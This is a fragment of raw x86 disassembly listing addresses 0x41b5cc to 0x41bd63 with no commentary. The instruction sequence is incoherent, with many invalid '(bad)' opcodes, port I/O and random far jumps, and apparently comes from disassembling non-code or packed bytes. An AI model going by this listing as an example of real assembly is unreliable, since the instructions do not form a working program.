  41b5cc:	jbe    0x41b57c
  41b5ce:	leave  
  41b5cf:	push   0xfca70897
  41b5d4:	popf   
  41b5d5:	loop   0x41b574
  41b5d7:	sbb    dl,BYTE PTR [eax+0x43]
  41b5da:	sbb    al,0xa9
  41b5dc:	push   esp
  41b5dd:	xchg   ebp,eax
  41b5de:	test   BYTE PTR [ebx+0x58ce91e6],0x66
  41b5e5:	adc    esp,0x5297b4f8
  41b5eb:	mov    edi,0x7caa0b46
  41b5f0:	xlat   BYTE PTR ds:[ebx]
  41b5f1:	push   ds
  41b5f2:	(bad)  
  41b5f3:	fstp   TBYTE PTR ds:0x1645aa88
  41b5f9:	xchg   al,bl
  41b5fb:	aas    
  41b5fc:	pop    es
  41b5fd:	jle    0x41b59b
  41b5ff:	repnz xor bl,BYTE PTR [edx+0x74b52d40]
  41b606:	sub    DWORD PTR [esi+ebx*8+0x41cfcd9f],ecx
  41b60d:	adc    BYTE PTR [eax],dl
  41b60f:	test   al,dl
  41b611:	call   0xa9f1:0x12ffffe
  41b618:	mov    WORD PTR [eax],ds
  41b61a:	jae    0x41b5a0
  41b61c:	(bad)
  41b61f:	cmp    eax,0x42216b10
  41b624:	retf   0xd34
  41b627:	mov    bh,0xac
  41b629:	jb     0x41b651
  41b62b:	lds    ecx,FWORD PTR [edi+0x418caaa5]
  41b631:	mov    esi,0xe806fb78
  41b636:	pusha  
  41b637:	mov    eax,ds:0xbc78a541
  41b63c:	ror    BYTE PTR [edx],1
  41b63e:	push   eax
  41b63f:	sub    eax,0x3e98a287
  41b644:	mov    bl,0x41
  41b646:	out    0x8e,eax
  41b648:	scas   al,BYTE PTR es:[edi]
  41b649:	cdq    
  41b64a:	fnstsw WORD PTR [ecx]
  41b64c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b64d:	jb     0x41b6c0
  41b64f:	or     DWORD PTR [eax-0xcf4ff29],edi
  41b655:	call   0xa680:0xa25fa003
  41b65c:	push   ecx
  41b65d:	mov    ah,0x46
  41b65f:	loopne 0x41b67e
  41b661:	jmp    0x41b69f
  41b663:	les    edi,FWORD PTR [edx+0x422756a]
  41b669:	sahf   
  41b66a:	ss push ebx
  41b66c:	mov    DWORD PTR [edi+eiz*4],edx
  41b66f:	push   ebp
  41b670:	pusha  
  41b671:	clc    
  41b672:	adc    BYTE PTR [ecx+ebp*8+0x6c1d1179],0xba
  41b67a:	dec    edi
  41b67b:	cmp    al,0x58
  41b67d:	push   eax
  41b67e:	ds sub eax,0x66d1312f
  41b684:	aaa    
  41b685:	and    eax,0x796e2343
  41b68a:	mov    esp,DWORD PTR [ecx-0x6c]
  41b68d:	js     0x41b686
  41b68f:	push   eax
  41b690:	retf   
  41b691:	mov    al,ds:0xf937d74a
  41b696:	mov    ecx,0xd491f502
  41b69b:	mov    ?,WORD PTR [ebx]
  41b69d:	in     al,0x3d
  41b69f:	sub    eax,0xf0a6b0c1
  41b6a4:	sub    BYTE PTR [edx+0x591d9b66],0x60
  41b6ab:	(bad)  
  41b6ac:	sub    DWORD PTR [ecx-0xbcaeb65],0x5ebdc44f
  41b6b6:	gs ins DWORD PTR es:[edi],dx
  41b6b8:	or     bh,dl
  41b6ba:	mov    bh,BYTE PTR [ebp+0xc]
  41b6bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6be:	jnp    0x41b6b7
  41b6c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6c1:	inc    esp
  41b6c2:	loop   0x41b722
  41b6c4:	mov    DWORD PTR [ecx+0x4211f515],edx
  41b6ca:	jle    0x41b72f
  41b6cc:	popf   
  41b6cd:	cmc    
  41b6ce:	xchg   edi,eax
  41b6cf:	daa    
  41b6d0:	dec    esi
  41b6d1:	fs jmp 0x7c85924b
  41b6d7:	and    DWORD PTR [edi],edx
  41b6d9:	push   ecx
  41b6da:	mov    cl,0xd7
  41b6dc:	adc    ah,BYTE PTR [edi]
  41b6de:	xchg   edi,eax
  41b6df:	loop   0x41b6d0
  41b6e1:	xor    bl,BYTE PTR [ebp+0x51892068]
  41b6e7:	outs   dx,BYTE PTR ds:[esi]
  41b6e8:	mov    WORD PTR [ebx+edx*4-0x22],cs
  41b6ec:	pushf  
  41b6ed:	popf   
  41b6ee:	fild   WORD PTR [ebp+eiz*1+0x6df2601f]
  41b6f5:	mov    DWORD PTR es:[edi-0x17cc280d],esp
  41b6fc:	mov    ch,BYTE PTR [edx+0xd]
  41b6ff:	jmp    0xb2f3:0x9f3465ca
  41b706:	jae    0x41b6dc
  41b708:	jb     0x41b772
  41b70a:	jae    0x41b6b5
  41b70c:	aad    0xfe
  41b70e:	mov    esp,0xbc33a20d
  41b713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b714:	nop    ecx
  41b717:	mov    ds:0xaff6a904,al
  41b71c:	retf   
  41b71d:	aas    
  41b71e:	(bad)  
  41b71f:	sub    DWORD PTR [ebp-0x5bef39b],ebx
  41b725:	ds push es
  41b727:	mov    edi,0x5bb733f0
  41b72c:	push   0xffffff87
  41b72e:	xchg   ecx,eax
  41b72f:	adc    BYTE PTR [ecx-0x58ab90d9],cl
  41b735:	sbb    eax,0x4c2ebc76
  41b73a:	call   0x5fda:0xa322bd53
  41b741:	jno    0x41b6f5
  41b743:	(bad)  
  41b744:	in     al,dx
  41b745:	or     DWORD PTR [ecx+0x16f9f3ed],eax
  41b74b:	sub    DWORD PTR [ecx+0x43],ecx
  41b74e:	adc    al,0xa8
  41b750:	scas   eax,DWORD PTR es:[edi]
  41b751:	add    DWORD PTR [edi-0x4d],ebp
  41b754:	in     eax,0x1d
  41b756:	bound  esi,QWORD PTR [eax+0x6bd7e36f]
  41b75c:	iret   
  41b75d:	adc    BYTE PTR [ecx-0x58],dl
  41b760:	and    eax,0x385fbc90
  41b765:	jo     0x41b7b7
  41b767:	jbe    0x41b7e4
  41b769:	ror    BYTE PTR [ebx+0x35bffd39],1
  41b76f:	xlat   BYTE PTR ds:[ebx]
  41b770:	cwde   
  41b771:	jl     0x41b712
  41b773:	inc    eax
  41b774:	pushf  
  41b775:	jns    0x41b78f
  41b777:	jmp    0x41b785
  41b779:	push   eax
  41b77a:	imul   esi,eax,0xeb9b7d40
  41b780:	push   esp
  41b781:	inc    ecx
  41b782:	dec    ebp
  41b783:	fist   WORD PTR [ebx-0x7b00af27]
  41b789:	into   
  41b78a:	enter  0xa52,0x9d
  41b78e:	retf   0x2b2b
  41b791:	imul   edi,DWORD PTR [edx+0x11],0xd9b16b59
  41b798:	in     al,dx
  41b799:	xor    eax,0x515bcee9
  41b79e:	mov    dh,0x37
  41b7a0:	or     DWORD PTR [ebx],ebx
  41b7a2:	aam    0xf2
  41b7a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7a5:	add    ebp,DWORD PTR ds:0x4a416e59
  41b7ab:	lock daa 
  41b7ad:	jae    0x41b7b4
  41b7af:	stc    
  41b7b0:	push   ebp
  41b7b1:	pop    ebp
  41b7b2:	rcl    cl,cl
  41b7b4:	sbb    BYTE PTR [edx-0x44101fc0],ch
  41b7ba:	pop    edx
  41b7bb:	retf   0x96e
  41b7be:	or     edi,DWORD PTR [esp+eiz*4-0x4b]
  41b7c2:	xchg   edi,eax
  41b7c3:	jnp    0x41b827
  41b7c5:	jbe    0x41b790
  41b7c7:	fisubr WORD PTR [edi-0x5]
  41b7ca:	add    BYTE PTR [edx+0x342fa56b],dh
  41b7d0:	push   ebp
  41b7d1:	dec    ebp
  41b7d2:	dec    esi
  41b7d3:	mov    esp,0xaa9a12c9
  41b7d8:	popa   
  41b7d9:	mov    bh,BYTE PTR [ebp+0x25e07f71]
  41b7df:	shl    WORD PTR [edx-0x24edb875],1
  41b7e6:	jb     0x41b78b
  41b7e8:	and    BYTE PTR [eax],0xaf
  41b7eb:	gs inc ebp
  41b7ed:	je     0x41b7f5
  41b7ef:	scas   al,BYTE PTR es:[edi]
  41b7f0:	jnp    0x41b781
  41b7f2:	test   DWORD PTR [edi],esp
  41b7f4:	sbb    ebx,eax
  41b7f6:	or     al,0x7f
  41b7f8:	retf   
  41b7f9:	push   ebp
  41b7fa:	hlt    
  41b7fb:	mov    BYTE PTR [edi+0x14],dh
  41b7fe:	sub    ah,BYTE PTR [edx]
  41b800:	in     eax,dx
  41b801:	pop    eax
  41b802:	mov    ah,0x65
  41b804:	(bad)  
  41b805:	sub    DWORD PTR [eax],ebp
  41b807:	xor    DWORD PTR [esp+edi*1],0xffffff96
  41b80b:	xor    eax,DWORD PTR [edx-0x3d]
  41b80e:	xor    eax,0x2f1fae2
  41b813:	je     0x41b83c
  41b815:	dec    esi
  41b816:	mov    eax,ebx
  41b818:	and    al,0x9d
  41b81a:	shl    BYTE PTR [esi],0x1c
  41b81d:	dec    edx
  41b81e:	ins    DWORD PTR es:[edi],dx
  41b81f:	pop    eax
  41b820:	arpl   WORD PTR [edx+0x40811799],sp
  41b826:	(bad)  
  41b827:	mov    bl,0x24
  41b829:	pop    edi
  41b82a:	fst    DWORD PTR [ebx+0x6a]
  41b82d:	mov    bl,0xb2
  41b82f:	nop
  41b830:	jmp    0x41b847
  41b832:	iret   
  41b833:	mov    WORD PTR ds:0xf4cc7f49,?
  41b839:	jg     0x41b832
  41b83b:	xchg   edi,eax
  41b83c:	scas   eax,DWORD PTR es:[edi]
  41b83d:	mov    bh,0xcc
  41b83f:	dec    eax
  41b840:	lds    eax,FWORD PTR [edi+0x30161b5e]
  41b846:	stc    
  41b847:	pop    ebp
  41b848:	push   ss
  41b849:	mov    al,ds:0x6696bfbb
  41b84e:	mov    cl,0x7a
  41b850:	aam    0x5f
  41b852:	ins    DWORD PTR es:[edi],dx
  41b853:	pop    edi
  41b854:	adc    DWORD PTR [esi+ebp*8],0x3023a20f
  41b85b:	or     bl,BYTE PTR [esi+0x126b0591]
  41b861:	imul   ebx,DWORD PTR [ebp-0x609ce24f],0x66
  41b868:	mov    bh,0xaf
  41b86a:	add    ecx,DWORD PTR [ebx+edi*1+0x55449621]
  41b871:	push   eax
  41b872:	inc    esp
  41b874:	out    dx,al
  41b875:	inc    ebp
  41b876:	ds popa 
  41b878:	add    bh,bl
  41b87a:	or     eax,0xfcef8b1
  41b87f:	dec    edx
  41b880:	cwde   
  41b881:	fucomip st,st(6)
  41b883:	pop    edx
  41b884:	push   edi
  41b885:	sbb    eax,0x146d3c2f
  41b88a:	inc    ebp
  41b88b:	push   ecx
  41b88c:	out    0x3c,al
  41b88e:	mov    eax,ds:0x885bfe63
  41b893:	std    
  41b894:	out    dx,al
  41b895:	xchg   esp,eax
  41b896:	jp     0x41b872
  41b898:	cli    
  41b899:	mov    ebx,DWORD PTR [edx]
  41b89b:	sbb    DWORD PTR [ecx+0x306085f7],edx
  41b8a1:	dec    ebp
  41b8a2:	push   eax
  41b8a3:	mov    dl,0x96
  41b8a5:	cmp    al,BYTE PTR [ecx+0x11]
  41b8a8:	inc    ebp
  41b8a9:	mov    DWORD PTR [ecx-0x62],esp
  41b8ac:	adc    eax,0x65648805
  41b8b1:	inc    esp
  41b8b2:	or     BYTE PTR [eax+eiz*8-0x18],0xf2
  41b8b7:	call   0x392c5d61
  41b8bc:	cmp    eax,0x5c733b2
  41b8c1:	xor    bl,al
  41b8c3:	sbb    DWORD PTR [ebx-0x5c943fba],ebx
  41b8c9:	jle    0x41b903
  41b8cb:	pop    ebx
  41b8cc:	aas    
  41b8cd:	cwde   
  41b8ce:	fsub   DWORD PTR [ebp-0x70]
  41b8d1:	call   0xa739:0x98264b30
  41b8d8:	mov    bl,0x71
  41b8da:	sub    DWORD PTR [edi-0x2220b5eb],ecx
  41b8e0:	in     eax,dx
  41b8e1:	push   ebx
  41b8e2:	fmul   DWORD PTR [ecx+edx*4+0x6ed7128]
  41b8e9:	xchg   esi,eax
  41b8ea:	push   esp
  41b8eb:	push   ebx
  41b8ec:	and    eax,0x5223d91b
  41b8f1:	mov    ds:0xa942b69d,al
  41b8f6:	in     eax,dx
  41b8f7:	dec    ecx
  41b8f8:	fild   WORD PTR [ebp+eiz*4-0x4a602088]
  41b8ff:	mov    ah,0x60
  41b901:	and    bh,BYTE PTR [edi+0x3f]
  41b904:	jecxz  0x41b91c
  41b906:	pop    ebx
  41b907:	aas    
  41b908:	add    al,0x55
  41b90a:	mov    bl,BYTE PTR [edi-0x226b785e]
  41b910:	mov    ds:0x255f9786,al
  41b915:	lods   al,BYTE PTR ds:[esi]
  41b916:	mov    ah,ch
  41b918:	loope  0x41b8e3
  41b91a:	ss dec edx
  41b91c:	sbb    al,0x51
  41b91f:	in     eax,0x85
  41b921:	add    BYTE PTR fs:[ebp+ebx*8-0x63],dh
  41b926:	xor    BYTE PTR [eax+ebp*4],0x3a
  41b92a:	clc    
  41b92b:	test   BYTE PTR [eax+0x14],ch
  41b92e:	pop    ebx
  41b92f:	call   0x4b5b:0x8e06a685
  41b936:	inc    esi
  41b937:	iret   
  41b938:	mov    DWORD PTR [edx+0x1a806af5],edi
  41b93e:	push   edi
  41b93f:	imul   esp,DWORD PTR [esi],0xffffff82
  41b942:	imul   ebp
  41b944:	cmp    BYTE PTR [ecx+0x2b],0x15
  41b948:	inc    edx
  41b949:	jg     0x41b927
  41b94b:	push   esp
  41b94c:	cmp    edx,eax
  41b94e:	sahf   
  41b94f:	mov    ebx,0x19bd53a1
  41b954:	push   edi
  41b955:	mov    dh,0x50
  41b957:	lods   al,BYTE PTR ds:[esi]
  41b958:	xor    edx,ebp
  41b95a:	or     ecx,DWORD PTR [edx+edx*4]
  41b95d:	test   eax,0x187a831a
  41b962:	mov    ebx,0xf98cdaa0
  41b967:	adc    al,0x9c
  41b969:	daa    
  41b96a:	cdq    
  41b96b:	test   eax,0x29986feb
  41b970:	enter  0x1ffd,0xf2
  41b974:	retf   0xe6bf
  41b977:	lea    edx,ds:[esp+ebx*1+0x570362a0]
  41b97f:	imul   ecx,DWORD PTR [edx+0xa],0x7f
  41b983:	pop    ebp
  41b984:	scas   eax,DWORD PTR es:[edi]
  41b985:	dec    ebx
  41b986:	dec    ecx
  41b987:	sbb    DWORD PTR [ebx+edi*8+0x47],esp
  41b98b:	and    DWORD PTR ds:0xaaa8a3df,eax
  41b991:	inc    ebp
  41b992:	scas   eax,DWORD PTR es:[edi]
  41b993:	xchg   esi,eax
  41b994:	inc    edx
  41b995:	xchg   esp,eax
  41b996:	sti    
  41b997:	or     ch,BYTE PTR [ebx]
  41b999:	sbb    esp,DWORD PTR [esi-0x36]
  41b99c:	adc    eax,0x6db45a94
  41b9a1:	test   eax,0xef94a10
  41b9a6:	dec    edi
  41b9a7:	jno    0x41b950
  41b9a9:	adc    BYTE PTR [eax],cl
  41b9ab:	push   es
  41b9ac:	retf   
  41b9ad:	xchg   ecx,eax
  41b9ae:	jae    0x41b947
  41b9b0:	push   ecx
  41b9b1:	dec    ecx
  41b9b2:	cmp    eax,0x9762ca17
  41b9b7:	jae    0x41ba17
  41b9b9:	push   ss
  41b9ba:	shl    BYTE PTR [ebp+0x62],0x13
  41b9be:	test   eax,0xc5c7de67
  41b9c3:	adc    al,0x2a
  41b9c5:	daa    
  41b9c6:	sub    ebx,DWORD PTR [ecx-0x1f]
  41b9c9:	xchg   esi,eax
  41b9ca:	jle    0x41b989
  41b9cc:	push   edx
  41b9cd:	enter  0x51b1,0x93
  41b9d1:	in     eax,0x6d
  41b9d3:	jecxz  0x41b9a5
  41b9d5:	dec    ebx
  41b9d6:	mov    dl,0xcc
  41b9d8:	shr    BYTE PTR [eax],cl
  41b9da:	jg     0x41b9ea
  41b9dc:	add    eax,0x68468e0d
  41b9e1:	fstp   DWORD PTR [edi-0x1dfbc27e]
  41b9e7:	(bad)  
  41b9e8:	out    dx,al
  41b9e9:	xchg   edi,eax
  41b9ea:	icebp  
  41b9eb:	pop    ds
  41b9ec:	mov    BYTE PTR [edi],cl
  41b9ee:	test   eax,0xb31e7c44
  41b9f3:	out    dx,al
  41b9f4:	fwait
  41b9f5:	rcl    DWORD PTR [edi],1
  41b9f7:	imul   BYTE PTR gs:[edx]
  41b9fa:	pop    edx
  41b9fb:	push   cs
  41b9fc:	sbb    eax,0x22062be2
  41ba01:	inc    ebp
  41ba02:	pop    ds
  41ba03:	inc    esp
  41ba04:	dec    edi
  41ba05:	lahf   
  41ba06:	and    eax,0xe9aefea1
  41ba0b:	das    
  41ba0c:	or     edx,ecx
  41ba0e:	push   ebx
  41ba0f:	fdivr  DWORD PTR [ebx+0x61935199]
  41ba15:	mov    ds:0x61154c26,al
  41ba1a:	jecxz  0x41ba43
  41ba1c:	lahf   
  41ba1d:	stc    
  41ba1e:	dec    edi
  41ba1f:	arpl   WORD PTR [edi],si
  41ba21:	pop    esp
  41ba22:	adc    ebx,edx
  41ba24:	cli    
  41ba25:	push   ss
  41ba26:	xor    ch,BYTE PTR [esi-0x1e]
  41ba29:	stos   DWORD PTR es:[edi],eax
  41ba2a:	test   bl,dh
  41ba2c:	lahf   
  41ba2d:	jmp    0xd5a8:0xf68aa254
  41ba34:	(bad)  
  41ba35:	cs out dx,eax
  41ba37:	or     al,0x43
  41ba39:	cli    
  41ba3a:	into   
  41ba3b:	icebp  
  41ba3c:	push   ss
  41ba3d:	inc    esp
  41ba3e:	sbb    eax,esi
  41ba40:	int    0x23
  41ba42:	ret    
  41ba43:	or     dl,ch
  41ba45:	imul   DWORD PTR [ecx+0xaba621f]
  41ba4b:	retf   
  41ba4c:	dec    ecx
  41ba4d:	or     bh,BYTE PTR [ebx-0x7f35010f]
  41ba53:	test   DWORD PTR [ebx-0x506a0669],edx
  41ba59:	and    al,0x94
  41ba5b:	sub    bh,ah
  41ba5d:	pop    esp
  41ba5e:	mov    al,ds:0xc32cf89d
  41ba63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba64:	lods   al,BYTE PTR ds:[esi]
  41ba65:	icebp  
  41ba66:	loope  0x41bae3
  41ba68:	stc    
  41ba69:	cmp    DWORD PTR [ebx],ebp
  41ba6b:	les    ebx,FWORD PTR [ebx+0x383135c8]
  41ba71:	sbb    bl,BYTE PTR [edx+ebp*2+0x4069ff25]
  41ba78:	enter  0x50d8,0xd0
  41ba7c:	mov    WORD PTR [ecx+0x57],cs
  41ba7f:	push   0x36e6dcf3
  41ba84:	shl    DWORD PTR ds:0x4d091226,1
  41ba8a:	mov    dh,0x75
  41ba8c:	jg     0x41baf0
  41ba8e:	ja     0x41ba19
  41ba90:	imul   edx,DWORD PTR [ebp-0x4b],0xffffffc8
  41ba94:	call   DWORD PTR [edx+0x5f]
  41ba97:	xchg   esp,eax
  41ba98:	out    dx,al
  41ba99:	int    0xc6
  41ba9b:	adc    edi,ebx
  41ba9d:	jbe    0x41bac0
  41ba9f:	fwait
  41baa0:	and    DWORD PTR [ebp-0x4a],edx
  41baa3:	dec    ebx
  41baa4:	test   bl,dh
  41baa6:	cmp    edx,esp
  41baa8:	les    ebx,FWORD PTR [ecx]
  41baaa:	std    
  41baab:	shl    DWORD PTR [ecx],1
  41baad:	sahf   
  41baae:	push   es
  41baaf:	fldcw  WORD PTR [eax+0x3b]
  41bab2:	ins    BYTE PTR es:[edi],dx
  41bab3:	out    0x60,al
  41bab5:	retf   0xd019
  41bab8:	pop    edi
  41bab9:	xchg   DWORD PTR [edi],edi
  41babb:	sub    ecx,DWORD PTR [esi-0x349b1c9a]
  41bac1:	adc    ch,bl
  41bac3:	out    dx,al
  41bac4:	jno    0x41bab5
  41bac6:	js     0x41baad
  41bac8:	aad    0x6a
  41baca:	mov    ah,0x96
  41bacc:	lock enter 0x6928,0xee
  41bad1:	cld    
  41bad2:	scas   eax,DWORD PTR es:[edi]
  41bad3:	jl     0x41babd
  41bad5:	push   cs
  41bad6:	not    DWORD PTR [ebp+0x1675f0e4]
  41badc:	inc    DWORD PTR [edx]
  41bade:	scas   al,BYTE PTR es:[edi]
  41badf:	fistp  WORD PTR [edi+0x3baa9c99]
  41bae5:	test   al,0xc1
  41bae7:	retf   0xe3bc
  41baea:	push   edx
  41baeb:	add    DWORD PTR [esi-0x2b],esp
  41baee:	mov    dh,0x6f
  41baf0:	or     al,0x14
  41baf2:	hlt    
  41baf3:	pop    eax
  41baf4:	fwait
  41baf5:	push   ebp
  41baf6:	inc    edi
  41baf7:	(bad)  
  41baf8:	aam    0xa8
  41bafa:	or     eax,0xbc6d1acc
  41baff:	fisttp DWORD PTR [esi+0x30789a04]
  41bb05:	mov    BYTE PTR [esi+0x43d58753],dh
  41bb0b:	inc    esp
  41bb0c:	arpl   WORD PTR [eax+ebx*4],bx
  41bb0f:	fwait
  41bb10:	mov    bh,0xe
  41bb12:	out    dx,eax
  41bb13:	xchg   dh,ah
  41bb15:	sub    BYTE PTR [ecx+0x434720c7],al
  41bb1b:	stos   BYTE PTR es:[edi],al
  41bb1c:	inc    ebx
  41bb1d:	nop
  41bb1e:	scas   eax,DWORD PTR es:[edi]
  41bb1f:	push   cs
  41bb20:	inc    edi
  41bb21:	test   DWORD PTR [esi+ebx*4],ebx
  41bb24:	clc    
  41bb25:	arpl   WORD PTR [edi],si
  41bb27:	sbb    eax,0xf158f547
  41bb2c:	sar    BYTE PTR [esi+0x2],1
  41bb2f:	je     0x41bada
  41bb31:	push   ecx
  41bb32:	out    dx,eax
  41bb33:	or     ah,BYTE PTR [ecx-0x516c602d]
  41bb39:	aas    
  41bb3a:	jno    0x41bacf
  41bb3c:	push   edi
  41bb3d:	daa    
  41bb3e:	jge    0x41bb8b
  41bb40:	dec    eax
  41bb41:	test   eax,ecx
  41bb43:	aad    0x57
  41bb45:	sbb    DWORD PTR [ecx-0x2bb2dff6],0x46
  41bb4c:	add    ah,BYTE PTR [esp+edx*8+0x24]
  41bb50:	sub    eax,0xca532e5c
  41bb55:	imul   eax,DWORD PTR [ecx],0xfe842a7
  41bb5b:	pop    esi
  41bb5c:	adc    BYTE PTR [ecx],bl
  41bb5e:	retf   
  41bb5f:	cli    
  41bb60:	cdq    
  41bb61:	jbe    0x41bb3c
  41bb63:	loope  0x41bbd6
  41bb65:	int    0x2d
  41bb67:	idiv   DWORD PTR [ebx]
  41bb69:	inc    esi
  41bb6a:	and    edi,DWORD PTR [edx]
  41bb6c:	or     cl,BYTE PTR [esi+ebp*2+0x46]
  41bb70:	xchg   DWORD PTR [eax+0x33eddd05],ebx
  41bb76:	call   0x8757:0x1f89132a
  41bb7d:	jmp    0x93941e91
  41bb82:	popf   
  41bb83:	ffreep st(2)
  41bb85:	into   
  41bb86:	not    DWORD PTR [edi-0xe2350a7]
  41bb8c:	cmp    eax,0xaa109db2
  41bb91:	data16 cmp al,0x8
  41bb94:	sahf   
  41bb95:	idiv   BYTE PTR [edx-0x53]
  41bb98:	je     0x41bbe7
  41bb9a:	mov    ebp,0x863454a0
  41bb9f:	mov    bh,bh
  41bba1:	test   ebx,ebx
  41bba3:	and    al,0xd7
  41bba5:	sub    eax,DWORD PTR [edx+0x41d04d45]
  41bbab:	dec    esi
  41bbac:	jle    0x41bb5c
  41bbae:	jbe    0x41bbcd
  41bbb0:	push   ecx
  41bbb1:	jae    0x41bbda
  41bbb3:	adc    bl,BYTE PTR [edi-0x16]
  41bbb6:	(bad)  
  41bbb7:	jl     0x41bba1
  41bbb9:	lahf   
  41bbba:	repnz inc esp
  41bbbc:	nop
  41bbbd:	test   DWORD PTR [ecx+0x1a305d61],ecx
  41bbc3:	leave  
  41bbc4:	xor    ah,bh
  41bbc6:	popa   
  41bbc7:	jmp    0xd435c0cf
  41bbcc:	or     edx,DWORD PTR [ebp-0x49]
  41bbcf:	mov    DWORD PTR [esi-0x24fb9586],edx
  41bbd5:	pop    edx
  41bbd6:	inc    BYTE PTR [eax-0x6c92ade9]
  41bbdc:	into   
  41bbdd:	mov    WORD PTR [esi+ebx*8-0x4a],gs
  41bbe1:	cmp    dl,BYTE PTR [ebx-0x4d]
  41bbe4:	cmp    BYTE PTR [esi],dl
  41bbe6:	sub    bl,BYTE PTR cs:[edi]
  41bbe9:	sbb    ah,BYTE PTR [ebx+0xa000c6e]
  41bbef:	push   edi
  41bbf0:	iret   
  41bbf1:	xor    BYTE PTR [ebx],0x25
  41bbf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbf5:	dec    edx
  41bbf6:	into   
  41bbf7:	jno    0x41bc58
  41bbf9:	mov    ebp,0xfa47e265
  41bbfe:	nop
  41bbff:	in     al,0x7
  41bc01:	into   
  41bc02:	int    0xc0
  41bc04:	mov    edi,0x9e2b84b0
  41bc09:	test   BYTE PTR [edx+ecx*4],dl
  41bc0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc0d:	test   BYTE PTR [ebx+0x56],0x3e
  41bc11:	ins    BYTE PTR es:[edi],dx
  41bc12:	in     al,dx
  41bc13:	jmp    0xaa9:0x4fff7432
  41bc1a:	pop    edx
  41bc1b:	or     DWORD PTR [esi+ecx*2-0x3a],0x8481ec4a
  41bc23:	fist   WORD PTR [ecx+0x57]
  41bc26:	xor    ah,BYTE PTR [esi+eax*4+0x45]
  41bc2a:	cmp    cl,ah
  41bc2c:	(bad)
  41bc31:	xor    ecx,DWORD PTR [ebx+0x5f]
  41bc34:	cmp    eax,DWORD PTR [edx+ecx*8+0x2510722c]
  41bc3b:	sub    BYTE PTR [edi],0x50
  41bc3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc3f:	mov    esp,0xc68398a4
  41bc44:	scas   eax,DWORD PTR es:[edi]
  41bc45:	lods   eax,DWORD PTR ds:[esi]
  41bc46:	leave  
  41bc47:	or     eax,0x98966d9
  41bc4c:	push   0x9607535a
  41bc51:	iret   
  41bc52:	repnz push 0xffffffe6
  41bc55:	js     0x41bc03
  41bc57:	mov    bl,0x35
  41bc59:	out    0xa4,eax
  41bc5b:	es jb  0x41bbe7
  41bc5e:	jnp    0x41bc12
  41bc60:	js     0x41bbf0
  41bc62:	arpl   WORD PTR [esi-0x28],sp
  41bc65:	shl    BYTE PTR [edx-0x34f6e856],0xdf
  41bc6c:	add    al,0x50
  41bc6e:	jp     0x41bcdb
  41bc70:	int3   
  41bc71:	mov    BYTE PTR [edi+0x51],al
  41bc74:	pop    ds
  41bc75:	add    BYTE PTR [esi+0x1d],bl
  41bc78:	push   esi
  41bc79:	add    DWORD PTR [edx+0x61],esi
  41bc7c:	callw  0x4d4e
  41bc80:	lahf   
  41bc81:	daa    
  41bc82:	dec    esp
  41bc83:	sub    al,0x29
  41bc85:	lock (bad) 
  41bc87:	(bad)
  41bc8a:	adc    ecx,DWORD PTR ds:0x36d44cec
  41bc90:	push   esi
  41bc91:	cmp    esi,ecx
  41bc93:	or     DWORD PTR [esi+0x499a4d],eax
  41bc99:	adc    al,0x76
  41bc9b:	mov    dl,0x50
  41bc9d:	or     al,0xc0
  41bc9f:	mov    ch,0x60
  41bca1:	sahf   
  41bca2:	or     cl,BYTE PTR [esi+0x4b22f0ea]
  41bca8:	shl    dh,1
  41bcaa:	mov    esp,0xb469f80a
  41bcaf:	fmul   QWORD PTR [ebx+0xa51b55b]
  41bcb5:	cmp    esp,DWORD PTR [edx+edi*1]
  41bcb8:	adc    eax,0xfeda30e8
  41bcbd:	out    0xf6,al
  41bcbf:	mov    ?,WORD PTR [bx-0x4d]
  41bcc3:	fs jge 0x41bc8a
  41bcc6:	add    DWORD PTR ds:0x141bbd12,0xffffff9a
  41bccd:	pop    esi
  41bcce:	in     eax,dx
  41bccf:	addr16 mov ds:0x691d,al
  41bcd3:	mov    ds:0x975cce8d,eax
  41bcd8:	pushw  0xff92
  41bcdb:	adc    al,0x1
  41bcdd:	xchg   bl,cl
  41bcdf:	push   ss
  41bce0:	and    DWORD PTR [eax],edx
  41bce2:	inc    ecx
  41bce3:	cmp    esp,DWORD PTR [edi+0xd6b0824]
  41bce9:	sbb    esi,DWORD PTR [ebp-0x25e2ff4c]
  41bcef:	ficomp DWORD PTR [eax-0x41ad4b13]
  41bcf5:	push   0x22ade504
  41bcfa:	neg    DWORD PTR [edx-0x23]
  41bcfd:	mov    ds:0x78273a12,eax
  41bd02:	ins    DWORD PTR es:[edi],dx
  41bd03:	jl     0x41bd5e
  41bd05:	xor    eax,0xfe6273ca
  41bd0a:	iret   
  41bd0b:	dec    eax
  41bd0c:	jmp    0x20a4ff16
  41bd11:	xchg   ecx,eax
  41bd12:	xor    BYTE PTR [esi+0x7c],0x7a
  41bd16:	mov    BYTE PTR [esi-0x1b0d79e3],ch
  41bd1c:	jmp    0x9989:0xecc27cfd
  41bd23:	xor    BYTE PTR [edx],bh
  41bd25:	std    
  41bd26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd27:	xchg   ecx,eax
  41bd28:	addr16 loop 0x41bd19
  41bd2b:	mov    ecx,0x558a5f8b
  41bd30:	das    
  41bd31:	pop    ebx
  41bd32:	mov    eax,DWORD PTR [ebp-0x28]
  41bd35:	dec    ecx
  41bd36:	cmp    DWORD PTR ds:0xa6c65de3,edi
  41bd3c:	comiss xmm6,DWORD PTR [edi-0x20]
  41bd40:	dec    ebx
  41bd41:	or     eax,0x7f6d4387
  41bd46:	inc    esp
  41bd47:	adc    ch,bl
  41bd49:	push   0xffffffe8
  41bd4b:	jecxz  0x41bcec
  41bd4d:	xchg   ebx,eax
  41bd4e:	(bad)  
  41bd4f:	xor    esp,eax
  41bd51:	dec    ecx
  41bd52:	fisubr DWORD PTR [edx*8+0x45bdb8f9]
  41bd59:	sub    BYTE PTR [eax-0x3522cbde],ah
  41bd5f:	pop    ss
  41bd60:	fwait
  41bd61:	and    DWORD PTR [edi],ebp
  41bd63:	add    BYTE PTR ds:0x47e9a2fa,ah
